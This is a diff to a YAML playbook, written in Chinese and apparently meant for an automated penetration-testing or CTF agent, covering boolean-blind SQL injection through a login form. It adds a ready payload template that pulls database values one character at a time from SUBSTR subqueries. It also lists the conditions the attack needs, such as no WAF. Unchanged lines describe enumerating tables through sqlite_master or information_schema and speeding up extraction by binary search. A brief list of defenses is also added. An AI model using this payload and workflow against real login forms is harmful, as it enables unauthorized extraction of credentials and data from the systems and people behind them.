@@ -19,6 +19,11 @@ trigger_signals:
   - "无 WAF 拦截"
   - "SQLite/MySQL 后端可枚举系统表"
 
+payloads:
+  - technique: "布尔盲注逐字符提取"
+    payload: "username: admin' AND (SELECT SUBSTR({column},{pos},1) FROM {table} LIMIT 1)='{char}'--"
+    note: "用登录成功/失败作为布尔Oracle"
+
 extraction_workflow:
   - step: "枚举表名"
     technique: "sqlite_master / information_schema"
@@ -36,6 +41,17 @@ extraction_workflow:
 payload_template: |
   username: "admin' AND (SELECT SUBSTR({column},{pos},1) FROM {table} LIMIT 1)='{char}'--"
   password: "x"
+
+prerequisites:
+  - "UNION SELECT不可用或列数不匹配"
+  - "登录成功/失败有明确布尔差异"
+  - "SQLite/MySQL可枚举系统表"
+  - "无WAF拦截"
+
+defense:
+  - "参数化查询"
+  - "响应内容归一化"
+  - "速率限制爆破尝试"
 
 optimizations:
   - "二分查找 (先测 ASCII 范围)"
